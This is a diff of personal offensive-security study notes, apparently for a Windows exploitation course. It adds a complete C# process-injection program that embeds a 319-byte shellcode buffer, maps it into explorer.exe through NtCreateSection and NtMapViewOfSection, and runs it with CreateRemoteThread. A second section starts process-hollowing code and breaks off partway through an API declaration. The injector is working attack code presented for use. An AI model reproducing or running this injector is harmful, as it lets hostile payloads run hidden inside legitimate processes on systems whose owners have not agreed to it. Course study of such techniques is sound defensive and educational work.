@@ -447,111 +447,164 @@ Create C# code that performs process injection using the four new APIs instead o
 and WriteProcessMemory. Convert the code to Jscript with DotNetToJscript. Note that 
 CreateRemoteThread must still be used to execute the shellcode
 
+https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection
 
-```
+
+need to make changes into nt function above.
+
+Copied from someplace
+
+```C#
 using System;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
-namespace Inject
+
+namespace c_hash_project
 {
     class Program
     {
+        // OpenProcess - kernel32.dll
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
-       processId);
-        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
-        static extern UInt32 NtCreateSection(
-        ref IntPtr SectionHandle,
-        UInt32 DesiredAccess,
-        IntPtr ObjectAttributes,
-        ref UInt32 MaximumSize,
-        UInt32 SectionPageProtection,
-        UInt32 AllocationAttributes,
-        IntPtr FileHandle);
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        // CreateRemoteThread - kernel32.dll
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(
+            IntPtr hProcess,
+            IntPtr lpThreadAttributes,
+            uint dwStackSize,
+            IntPtr lpStartAddress,
+            IntPtr lpParameter,
+            uint dwCreationFlags,
+            IntPtr lpThreadId);
+
+        // GetCurrentProcess - kernel32.dll
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr GetCurrentProcess();
+
+        // ntdll.dll API functions:
+        // NtCreateSection
+        [DllImport("ntdll.dll")]
+        public static extern UInt32 NtCreateSection(
+            ref IntPtr section,
+            UInt32 desiredAccess,
+            IntPtr pAttrs,
+            ref long MaxSize,
+            uint pageProt,
+            uint allocationAttribs,
+            IntPtr hFile);
+
+        // NtMapViewOfSection
+        [DllImport("ntdll.dll")]
+        public static extern UInt32 NtMapViewOfSection(
+            IntPtr SectionHandle,
+            IntPtr ProcessHandle,
+            ref IntPtr BaseAddress,
+            IntPtr ZeroBits,
+            IntPtr CommitSize,
+            ref long SectionOffset,
+            ref long ViewSize,
+            uint InheritDisposition,
+            uint AllocationType,
+            uint Win32Protect);
+
+        // NtUnmapViewOfSection
         [DllImport("ntdll.dll", SetLastError = true)]
-        static extern uint NtMapViewOfSection(
-    IntPtr SectionHandle,
-    IntPtr ProcessHandle,
-    ref IntPtr BaseAddress,
-    UIntPtr ZeroBits,
-    UIntPtr CommitSize,
-    out ulong SectionOffset,
-    out uint ViewSize,
-    uint InheritDisposition,
-    uint AllocationType,
-    uint Win32Protect);
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
-       dwSize, uint flAllocationType, uint flProtect);
-        [DllImport("kernel32.dll")]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
-       byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
-       lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
-       dwCreationFlags, IntPtr lpThreadId);
-        static void Main(string[] args)
+        static extern uint NtUnmapViewOfSection(
+            IntPtr hProc,
+            IntPtr baseAddr);
+
+        // NtClose
+        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
+        static extern int NtClose(IntPtr hObject);
+
+        static int Main(string[] args)
         {
-
-         IntPtr SectionHandle = IntPtr.Zero;
-         uint MaximumSize = 2048;
-         private static uint SEC_COMMIT = 0x08000000;
-         private static uint SECTION_MAP_WRITE = 0x0002;
-         private static uint SECTION_MAP_READ = 0x0004;
-         private static uint SECTION_MAP_EXECUTE = 0x0008;
-         private static uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
-         uint res = NtCreateSection(ref SectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref MaximumSize, EXECUTE_READ_WRITE, SEC_COMMIT, IntPtr.Zero);
-        // res = 0 indicates a successful creation of section
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        static extern uint NtMapViewOfSection(
-   IntPtr SectionHandle,
-   IntPtr ProcessHandle,
-   ref IntPtr BaseAddress,
-   UIntPtr ZeroBits,
-   UIntPtr CommitSize,
-   out ulong SectionOffset,
-   out uint ViewSize,
-   uint InheritDisposition,
-   uint AllocationType,
-   uint Win32Protect);
-
-        IntPtr hProcess = OpenProcess(0x001F0FFF, false, 7676);
-            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             byte[] buf = new byte[319] {
-                0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
-                0xff,0xff,0x48,0xbb,0xb6,0x91,0x18,0x2b,0x1c,0x05,0x92,0x1b,0x48,0x31,0x58,
-                0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x4a,0xd9,0x9b,0xcf,0xec,0xed,
-                0x52,0x1b,0xb6,0x91,0x59,0x7a,0x5d,0x55,0xc0,0x4a,0xe0,0xd9,0x29,0xf9,0x79,
-                0x4d,0x19,0x49,0xd6,0xd9,0x93,0x79,0x04,0x4d,0x19,0x49,0x96,0xd9,0x93,0x59,
-                0x4c,0x4d,0x9d,0xac,0xfc,0xdb,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xad,0x79,
-                0x57,0x1e,0x29,0xb2,0x5a,0x77,0x58,0x15,0x6a,0x1d,0xc4,0x70,0xf6,0xe4,0xd0,
-                0x49,0x63,0x97,0x57,0xb2,0x90,0xf4,0xad,0x50,0x2a,0xcc,0x8e,0x12,0x93,0xb6,
-                0x91,0x18,0x63,0x99,0xc5,0xe6,0x7c,0xfe,0x90,0xc8,0x7b,0x97,0x4d,0x8a,0x5f,
-                0x3d,0xd1,0x38,0x62,0x1d,0xd5,0x71,0x4d,0xfe,0x6e,0xd1,0x6a,0x97,0x31,0x1a,
-                0x53,0xb7,0x47,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xd0,0xd9,0xe2,0x11,0x44,
-                0x93,0xda,0x8e,0x71,0x6d,0xda,0x50,0x06,0xde,0x3f,0xbe,0xd4,0x21,0xfa,0x69,
-                0xdd,0xca,0x5f,0x3d,0xd1,0x3c,0x62,0x1d,0xd5,0xf4,0x5a,0x3d,0x9d,0x50,0x6f,
-                0x97,0x45,0x8e,0x52,0xb7,0x41,0x59,0xa0,0x18,0x8d,0xda,0x1a,0x66,0xd0,0x40,
-                0x6a,0x44,0x5b,0xcb,0x41,0xf7,0xc9,0x59,0x72,0x5d,0x5f,0xda,0x98,0x5a,0xb1,
-                0x59,0x79,0xe3,0xe5,0xca,0x5a,0xef,0xcb,0x50,0xa0,0x0e,0xec,0xc5,0xe4,0x49,
-                0x6e,0x45,0x63,0xa6,0x04,0x92,0x1b,0xb6,0x91,0x18,0x2b,0x1c,0x4d,0x1f,0x96,
-                0xb7,0x90,0x18,0x2b,0x5d,0xbf,0xa3,0x90,0xd9,0x16,0xe7,0xfe,0xa7,0xf5,0x27,
-                0xb9,0xe0,0xd0,0xa2,0x8d,0x89,0xb8,0x0f,0xe4,0x63,0xd9,0x9b,0xef,0x34,0x39,
-                0x94,0x67,0xbc,0x11,0xe3,0xcb,0x69,0x00,0x29,0x5c,0xa5,0xe3,0x77,0x41,0x1c,
-                0x5c,0xd3,0x92,0x6c,0x6e,0xcd,0x48,0x7d,0x69,0xf1,0x35,0xd3,0xe9,0x7d,0x2b,
-                0x1c,0x05,0x92,0x1b };
-            IntPtr outSize;
-            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
-            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
-           IntPtr.Zero, 0, IntPtr.Zero);
+            0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
+            0xff,0xff,0x48,0xbb,0xb6,0x91,0x18,0x2b,0x1c,0x05,0x92,0x1b,0x48,0x31,0x58,
+            0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x4a,0xd9,0x9b,0xcf,0xec,0xed,
+            0x52,0x1b,0xb6,0x91,0x59,0x7a,0x5d,0x55,0xc0,0x4a,0xe0,0xd9,0x29,0xf9,0x79,
+            0x4d,0x19,0x49,0xd6,0xd9,0x93,0x79,0x04,0x4d,0x19,0x49,0x96,0xd9,0x93,0x59,
+            0x4c,0x4d,0x9d,0xac,0xfc,0xdb,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xad,0x79,
+            0x57,0x1e,0x29,0xb2,0x5a,0x77,0x58,0x15,0x6a,0x1d,0xc4,0x70,0xf6,0xe4,0xd0,
+            0x49,0x63,0x97,0x57,0xb2,0x90,0xf4,0xad,0x50,0x2a,0xcc,0x8e,0x12,0x93,0xb6,
+            0x91,0x18,0x63,0x99,0xc5,0xe6,0x7c,0xfe,0x90,0xc8,0x7b,0x97,0x4d,0x8a,0x5f,
+            0x3d,0xd1,0x38,0x62,0x1d,0xd5,0x71,0x4d,0xfe,0x6e,0xd1,0x6a,0x97,0x31,0x1a,
+            0x53,0xb7,0x47,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xd0,0xd9,0xe2,0x11,0x44,
+            0x93,0xda,0x8e,0x71,0x6d,0xda,0x50,0x06,0xde,0x3f,0xbe,0xd4,0x21,0xfa,0x69,
+            0xdd,0xca,0x5f,0x3d,0xd1,0x3c,0x62,0x1d,0xd5,0xf4,0x5a,0x3d,0x9d,0x50,0x6f,
+            0x97,0x45,0x8e,0x52,0xb7,0x41,0x59,0xa0,0x18,0x8d,0xda,0x1a,0x66,0xd0,0x40,
+            0x6a,0x44,0x5b,0xcb,0x41,0xf7,0xc9,0x59,0x72,0x5d,0x5f,0xda,0x98,0x5a,0xb1,
+            0x59,0x79,0xe3,0xe5,0xca,0x5a,0xef,0xcb,0x50,0xa0,0x0e,0xec,0xc5,0xe4,0x49,
+            0x6e,0x45,0x63,0xa6,0x04,0x92,0x1b,0xb6,0x91,0x18,0x2b,0x1c,0x4d,0x1f,0x96,
+            0xb7,0x90,0x18,0x2b,0x5d,0xbf,0xa3,0x90,0xd9,0x16,0xe7,0xfe,0xa7,0xf5,0x27,
+            0xb9,0xe0,0xd0,0xa2,0x8d,0x89,0xb8,0x0f,0xe4,0x63,0xd9,0x9b,0xef,0x34,0x39,
+            0x94,0x67,0xbc,0x11,0xe3,0xcb,0x69,0x00,0x29,0x5c,0xa5,0xe3,0x77,0x41,0x1c,
+            0x5c,0xd3,0x92,0x6c,0x6e,0xcd,0x48,0x7d,0x69,0xf1,0x35,0xd3,0xe9,0x7d,0x2b,
+            0x1c,0x05,0x92,0x1b };
+            long buffer_size = buf.Length;
+
+            // Create the section handle.
+            IntPtr ptr_section_handle = IntPtr.Zero;
+            // fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+            UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);
+            if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] An error occured while creating the section.");
+                return -1;
+            }
+            Console.WriteLine("[+] The section has been created successfully.");
+            Console.WriteLine("[*] ptr_section_handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));
+
+            // Map a view of a section into the virtual address space of the current process.
+            long local_section_offset = 0;
+            IntPtr ptr_local_section_addr = IntPtr.Zero;
+            UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);
+
+            if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] An error occured while mapping the view within the local section.");
+                return -1;
+            }
+            Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
+            Console.WriteLine("[*] ptr_local_section_addr: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));
+
+            // Copy the shellcode into the mapped section.
+            //memcpy(localSectionAddress, buf, sizeof(buf));
+            Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);
+
+            // Map a view of the section in the virtual address space of the targeted process.
+            var process = Process.GetProcessesByName("explorer")[0];
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
+            IntPtr ptr_remote_section_addr = IntPtr.Zero;
+            // fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
+            UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);
+
+            if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
+                return -1;
+            }
+            Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
+            Console.WriteLine("[*] ptr_remote_section_addr: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));
+
+            // Unmap the view of the section from the current process & close the handle.
+            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
+            NtClose(ptr_section_handle);
+
+            CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
+            return 0;
         }
     }
 }
-
-
 ```
 
-need to make changes into nt function above.
+
+To read
+https://www.fergonez.net/post/shellcode-csharp
+
+To put any kind of shellcode into csharp.
 
 
 # DLL injection
@@ -809,9 +862,538 @@ example value of 0x110 meaning the PE header is at 07ffff01000110
 
 # Process hollowing in C#
 
-need to do the program part
+looking at ZwQueryInformationProcess - THe functions prefix Nt or Zw indicates that the api can be called by either a usermode program or by a kernla based program
+
+```C#
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
 
 
+
+namespace Hollow
+{
+
+    internal class Program
+    {
+        
+
+        // This also works with CharSet.Ansi as long as the calling function uses the same character set.
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        private struct PROCESS_BASIC_INFORMATION
+        {
+            public NtStatus ExitStatus;
+            public IntPtr PebBaseAddress;
+            public UIntPtr AffinityMask;
+            public int BasePriority;
+            public UIntPtr UniqueProcessId;
+            public UIntPtr InheritedFromUniqueProcessId;
+        }
+
+        public enum NtStatus : uint
+        {
+            // Success
+            Success = 0x00000000,
+            Wait0 = 0x00000000,
+            Wait1 = 0x00000001,
+            Wait2 = 0x00000002,
+            Wait3 = 0x00000003,
+            Wait63 = 0x0000003f,
+            Abandoned = 0x00000080,
+            AbandonedWait0 = 0x00000080,
+            AbandonedWait1 = 0x00000081,
+            AbandonedWait2 = 0x00000082,
+            AbandonedWait3 = 0x00000083,
+            AbandonedWait63 = 0x000000bf,
+            UserApc = 0x000000c0,
+            KernelApc = 0x00000100,
+            Alerted = 0x00000101,
+            Timeout = 0x00000102,
+            Pending = 0x00000103,
+            Reparse = 0x00000104,
+            MoreEntries = 0x00000105,
+            NotAllAssigned = 0x00000106,
+            SomeNotMapped = 0x00000107,
+            OpLockBreakInProgress = 0x00000108,
+            VolumeMounted = 0x00000109,
+            RxActCommitted = 0x0000010a,
+            NotifyCleanup = 0x0000010b,
+            NotifyEnumDir = 0x0000010c,
+            NoQuotasForAccount = 0x0000010d,
+            PrimaryTransportConnectFailed = 0x0000010e,
+            PageFaultTransition = 0x00000110,
+            PageFaultDemandZero = 0x00000111,
+            PageFaultCopyOnWrite = 0x00000112,
+            PageFaultGuardPage = 0x00000113,
+            PageFaultPagingFile = 0x00000114,
+            CrashDump = 0x00000116,
+            ReparseObject = 0x00000118,
+            NothingToTerminate = 0x00000122,
+            ProcessNotInJob = 0x00000123,
+            ProcessInJob = 0x00000124,
+            ProcessCloned = 0x00000129,
+            FileLockedWithOnlyReaders = 0x0000012a,
+            FileLockedWithWriters = 0x0000012b,
+
+            // Informational
+            Informational = 0x40000000,
+            ObjectNameExists = 0x40000000,
+            ThreadWasSuspended = 0x40000001,
+            WorkingSetLimitRange = 0x40000002,
+            ImageNotAtBase = 0x40000003,
+            RegistryRecovered = 0x40000009,
+
+            // Warning
+            Warning = 0x80000000,
+            GuardPageViolation = 0x80000001,
+            DatatypeMisalignment = 0x80000002,
+            Breakpoint = 0x80000003,
+            SingleStep = 0x80000004,
+            BufferOverflow = 0x80000005,
+            NoMoreFiles = 0x80000006,
+            HandlesClosed = 0x8000000a,
+            PartialCopy = 0x8000000d,
+            DeviceBusy = 0x80000011,
+            InvalidEaName = 0x80000013,
+            EaListInconsistent = 0x80000014,
+            NoMoreEntries = 0x8000001a,
+            LongJump = 0x80000026,
+            DllMightBeInsecure = 0x8000002b,
+
+            // Error
+            Error = 0xc0000000,
+            Unsuccessful = 0xc0000001,
+            NotImplemented = 0xc0000002,
+            InvalidInfoClass = 0xc0000003,
+            InfoLengthMismatch = 0xc0000004,
+            AccessViolation = 0xc0000005,
+            InPageError = 0xc0000006,
+            PagefileQuota = 0xc0000007,
+            InvalidHandle = 0xc0000008,
+            BadInitialStack = 0xc0000009,
+            BadInitialPc = 0xc000000a,
+            InvalidCid = 0xc000000b,
+            TimerNotCanceled = 0xc000000c,
+            InvalidParameter = 0xc000000d,
+            NoSuchDevice = 0xc000000e,
+            NoSuchFile = 0xc000000f,
+            InvalidDeviceRequest = 0xc0000010,
+            EndOfFile = 0xc0000011,
+            WrongVolume = 0xc0000012,
+            NoMediaInDevice = 0xc0000013,
+            NoMemory = 0xc0000017,
+            NotMappedView = 0xc0000019,
+            UnableToFreeVm = 0xc000001a,
+            UnableToDeleteSection = 0xc000001b,
+            IllegalInstruction = 0xc000001d,
+            AlreadyCommitted = 0xc0000021,
+            AccessDenied = 0xc0000022,
+            BufferTooSmall = 0xc0000023,
+            ObjectTypeMismatch = 0xc0000024,
+            NonContinuableException = 0xc0000025,
+            BadStack = 0xc0000028,
+            NotLocked = 0xc000002a,
+            NotCommitted = 0xc000002d,
+            InvalidParameterMix = 0xc0000030,
+            ObjectNameInvalid = 0xc0000033,
+            ObjectNameNotFound = 0xc0000034,
+            ObjectNameCollision = 0xc0000035,
+            ObjectPathInvalid = 0xc0000039,
+            ObjectPathNotFound = 0xc000003a,
+            ObjectPathSyntaxBad = 0xc000003b,
+            DataOverrun = 0xc000003c,
+            DataLate = 0xc000003d,
+            DataError = 0xc000003e,
+            CrcError = 0xc000003f,
+            SectionTooBig = 0xc0000040,
+            PortConnectionRefused = 0xc0000041,
+            InvalidPortHandle = 0xc0000042,
+            SharingViolation = 0xc0000043,
+            QuotaExceeded = 0xc0000044,
+            InvalidPageProtection = 0xc0000045,
+            MutantNotOwned = 0xc0000046,
+            SemaphoreLimitExceeded = 0xc0000047,
+            PortAlreadySet = 0xc0000048,
+            SectionNotImage = 0xc0000049,
+            SuspendCountExceeded = 0xc000004a,
+            ThreadIsTerminating = 0xc000004b,
+            BadWorkingSetLimit = 0xc000004c,
+            IncompatibleFileMap = 0xc000004d,
+            SectionProtection = 0xc000004e,
+            EasNotSupported = 0xc000004f,
+            EaTooLarge = 0xc0000050,
+            NonExistentEaEntry = 0xc0000051,
+            NoEasOnFile = 0xc0000052,
+            EaCorruptError = 0xc0000053,
+            FileLockConflict = 0xc0000054,
+            LockNotGranted = 0xc0000055,
+            DeletePending = 0xc0000056,
+            CtlFileNotSupported = 0xc0000057,
+            UnknownRevision = 0xc0000058,
+            RevisionMismatch = 0xc0000059,
+            InvalidOwner = 0xc000005a,
+            InvalidPrimaryGroup = 0xc000005b,
+            NoImpersonationToken = 0xc000005c,
+            CantDisableMandatory = 0xc000005d,
+            NoLogonServers = 0xc000005e,
+            NoSuchLogonSession = 0xc000005f,
+            NoSuchPrivilege = 0xc0000060,
+            PrivilegeNotHeld = 0xc0000061,
+            InvalidAccountName = 0xc0000062,
+            UserExists = 0xc0000063,
+            NoSuchUser = 0xc0000064,
+            GroupExists = 0xc0000065,
+            NoSuchGroup = 0xc0000066,
+            MemberInGroup = 0xc0000067,
+            MemberNotInGroup = 0xc0000068,
+            LastAdmin = 0xc0000069,
+            WrongPassword = 0xc000006a,
+            IllFormedPassword = 0xc000006b,
+            PasswordRestriction = 0xc000006c,
+            LogonFailure = 0xc000006d,
+            AccountRestriction = 0xc000006e,
+            InvalidLogonHours = 0xc000006f,
+            InvalidWorkstation = 0xc0000070,
+            PasswordExpired = 0xc0000071,
+            AccountDisabled = 0xc0000072,
+            NoneMapped = 0xc0000073,
+            TooManyLuidsRequested = 0xc0000074,
+            LuidsExhausted = 0xc0000075,
+            InvalidSubAuthority = 0xc0000076,
+            InvalidAcl = 0xc0000077,
+            InvalidSid = 0xc0000078,
+            InvalidSecurityDescr = 0xc0000079,
+            ProcedureNotFound = 0xc000007a,
+            InvalidImageFormat = 0xc000007b,
+            NoToken = 0xc000007c,
+            BadInheritanceAcl = 0xc000007d,
+            RangeNotLocked = 0xc000007e,
+            DiskFull = 0xc000007f,
+            ServerDisabled = 0xc0000080,
+            ServerNotDisabled = 0xc0000081,
+            TooManyGuidsRequested = 0xc0000082,
+            GuidsExhausted = 0xc0000083,
+            InvalidIdAuthority = 0xc0000084,
+            AgentsExhausted = 0xc0000085,
+            InvalidVolumeLabel = 0xc0000086,
+            SectionNotExtended = 0xc0000087,
+            NotMappedData = 0xc0000088,
+            ResourceDataNotFound = 0xc0000089,
+            ResourceTypeNotFound = 0xc000008a,
+            ResourceNameNotFound = 0xc000008b,
+            ArrayBoundsExceeded = 0xc000008c,
+            FloatDenormalOperand = 0xc000008d,
+            FloatDivideByZero = 0xc000008e,
+            FloatInexactResult = 0xc000008f,
+            FloatInvalidOperation = 0xc0000090,
+            FloatOverflow = 0xc0000091,
+            FloatStackCheck = 0xc0000092,
+            FloatUnderflow = 0xc0000093,
+            IntegerDivideByZero = 0xc0000094,
+            IntegerOverflow = 0xc0000095,
+            PrivilegedInstruction = 0xc0000096,
+            TooManyPagingFiles = 0xc0000097,
+            FileInvalid = 0xc0000098,
+            InstanceNotAvailable = 0xc00000ab,
+            PipeNotAvailable = 0xc00000ac,
+            InvalidPipeState = 0xc00000ad,
+            PipeBusy = 0xc00000ae,
+            IllegalFunction = 0xc00000af,
+            PipeDisconnected = 0xc00000b0,
+            PipeClosing = 0xc00000b1,
+            PipeConnected = 0xc00000b2,
+            PipeListening = 0xc00000b3,
+            InvalidReadMode = 0xc00000b4,
+            IoTimeout = 0xc00000b5,
+            FileForcedClosed = 0xc00000b6,
+            ProfilingNotStarted = 0xc00000b7,
+            ProfilingNotStopped = 0xc00000b8,
+            NotSameDevice = 0xc00000d4,
+            FileRenamed = 0xc00000d5,
+            CantWait = 0xc00000d8,
+            PipeEmpty = 0xc00000d9,
+            CantTerminateSelf = 0xc00000db,
+            InternalError = 0xc00000e5,
+            InvalidParameter1 = 0xc00000ef,
+            InvalidParameter2 = 0xc00000f0,
+            InvalidParameter3 = 0xc00000f1,
+            InvalidParameter4 = 0xc00000f2,
+            InvalidParameter5 = 0xc00000f3,
+            InvalidParameter6 = 0xc00000f4,
+            InvalidParameter7 = 0xc00000f5,
+            InvalidParameter8 = 0xc00000f6,
+            InvalidParameter9 = 0xc00000f7,
+            InvalidParameter10 = 0xc00000f8,
+            InvalidParameter11 = 0xc00000f9,
+            InvalidParameter12 = 0xc00000fa,
+            MappedFileSizeZero = 0xc000011e,
+            TooManyOpenedFiles = 0xc000011f,
+            Cancelled = 0xc0000120,
+            CannotDelete = 0xc0000121,
+            InvalidComputerName = 0xc0000122,
+            FileDeleted = 0xc0000123,
+            SpecialAccount = 0xc0000124,
+            SpecialGroup = 0xc0000125,
+            SpecialUser = 0xc0000126,
+            MembersPrimaryGroup = 0xc0000127,
+            FileClosed = 0xc0000128,
+            TooManyThreads = 0xc0000129,
+            ThreadNotInProcess = 0xc000012a,
+            TokenAlreadyInUse = 0xc000012b,
+            PagefileQuotaExceeded = 0xc000012c,
+            CommitmentLimit = 0xc000012d,
+            InvalidImageLeFormat = 0xc000012e,
+            InvalidImageNotMz = 0xc000012f,
+            InvalidImageProtect = 0xc0000130,
+            InvalidImageWin16 = 0xc0000131,
+            LogonServer = 0xc0000132,
+            DifferenceAtDc = 0xc0000133,
+            SynchronizationRequired = 0xc0000134,
+            DllNotFound = 0xc0000135,
+            IoPrivilegeFailed = 0xc0000137,
+            OrdinalNotFound = 0xc0000138,
+            EntryPointNotFound = 0xc0000139,
+            ControlCExit = 0xc000013a,
+            PortNotSet = 0xc0000353,
+            DebuggerInactive = 0xc0000354,
+            CallbackBypass = 0xc0000503,
+            PortClosed = 0xc0000700,
+            MessageLost = 0xc0000701,
+            InvalidMessage = 0xc0000702,
+            RequestCanceled = 0xc0000703,
+            RecursiveDispatch = 0xc0000704,
+            LpcReceiveBufferExpected = 0xc0000705,
+            LpcInvalidConnectionUsage = 0xc0000706,
+            LpcRequestsNotAllowed = 0xc0000707,
+            ResourceInUse = 0xc0000708,
+            ProcessIsProtected = 0xc0000712,
+            VolumeDirty = 0xc0000806,
+            FileCheckedOut = 0xc0000901,
+            CheckOutRequired = 0xc0000902,
+            BadFileType = 0xc0000903,
+            FileTooLarge = 0xc0000904,
+            FormsAuthRequired = 0xc0000905,
+            VirusInfected = 0xc0000906,
+            VirusDeleted = 0xc0000907,
+            TransactionalConflict = 0xc0190001,
+            InvalidTransaction = 0xc0190002,
+            TransactionNotActive = 0xc0190003,
+            TmInitializationFailed = 0xc0190004,
+            RmNotActive = 0xc0190005,
+            RmMetadataCorrupt = 0xc0190006,
+            TransactionNotJoined = 0xc0190007,
+            DirectoryNotRm = 0xc0190008,
+            CouldNotResizeLog = 0xc0190009,
+            TransactionsUnsupportedRemote = 0xc019000a,
+            LogResizeInvalidSize = 0xc019000b,
+            RemoteFileVersionMismatch = 0xc019000c,
+            CrmProtocolAlreadyExists = 0xc019000f,
+            TransactionPropagationFailed = 0xc0190010,
+            CrmProtocolNotFound = 0xc0190011,
+            TransactionSuperiorExists = 0xc0190012,
+            TransactionRequestNotValid = 0xc0190013,
+            TransactionNotRequested = 0xc0190014,
+            TransactionAlreadyAborted = 0xc0190015,
+            TransactionAlreadyCommitted = 0xc0190016,
+            TransactionInvalidMarshallBuffer = 0xc0190017,
+            CurrentTransactionNotValid = 0xc0190018,
+            LogGrowthFailed = 0xc0190019,
+            ObjectNoLongerExists = 0xc0190021,
+            StreamMiniversionNotFound = 0xc0190022,
+            StreamMiniversionNotValid = 0xc0190023,
+            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
+            CantOpenMiniversionWithModifyIntent = 0xc0190025,
+            CantCreateMoreStreamMiniversions = 0xc0190026,
+            HandleNoLongerValid = 0xc0190028,
+            NoTxfMetadata = 0xc0190029,
+            LogCorruptionDetected = 0xc0190030,
+            CantRecoverWithHandleOpen = 0xc0190031,
+            RmDisconnected = 0xc0190032,
+            EnlistmentNotSuperior = 0xc0190033,
+            RecoveryNotNeeded = 0xc0190034,
+            RmAlreadyStarted = 0xc0190035,
+            FileIdentityNotPersistent = 0xc0190036,
+            CantBreakTransactionalDependency = 0xc0190037,
+            CantCrossRmBoundary = 0xc0190038,
+            TxfDirNotEmpty = 0xc0190039,
+            IndoubtTransactionsExist = 0xc019003a,
+            TmVolatile = 0xc019003b,
+            RollbackTimerExpired = 0xc019003c,
+            TxfAttributeCorrupt = 0xc019003d,
+            EfsNotAllowedInTransaction = 0xc019003e,
+            TransactionalOpenNotAllowed = 0xc019003f,
+            TransactedMappingUnsupportedRemote = 0xc0190040,
+            TxfMetadataAlreadyPresent = 0xc0190041,
+            TransactionScopeCallbacksNotSet = 0xc0190042,
+            TransactionRequiredPromotion = 0xc0190043,
+            CannotExecuteFileInTransaction = 0xc0190044,
+            TransactionsNotFrozen = 0xc0190045,
+
+            MaximumNtStatus = 0xffffffff
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern bool CreateProcess(
+            string lpApplicationName, 
+            string lpCommandLine,
+            IntPtr lpProcessAttributes, 
+            IntPtr lpThreadAttributes, 
+            bool bInheritHandles,
+            uint dwCreationFlags, 
+            IntPtr lpEnvironment, 
+            string lpCurrentDirectory,
+            [In] ref STARTUPINFO lpStartupInfo, 
